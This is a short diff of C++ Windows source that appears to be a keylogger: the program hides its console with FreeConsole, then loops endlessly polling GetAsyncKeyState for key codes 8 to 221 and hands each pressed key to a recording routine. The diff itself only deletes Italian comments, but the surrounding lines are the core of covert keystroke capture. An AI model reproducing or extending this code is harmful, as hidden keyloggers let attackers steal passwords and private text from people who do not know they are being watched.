@@ -16,9 +16,9 @@ int main()
     FreeConsole(); //HIDE CONSOLE
     while(true)
     {
-        for(int i=8; i<222; i++) //CODIFICA CARATTERE AASCI
+        for(int i=8; i<222; i++)
         {
-            if(GetAsyncKeyState(i) != press) //VERIFICARE SE CI SONO IMPULSI
+            if(GetAsyncKeyState(i) != press)
             {
                 key(i);
                 Sleep(DELAY);
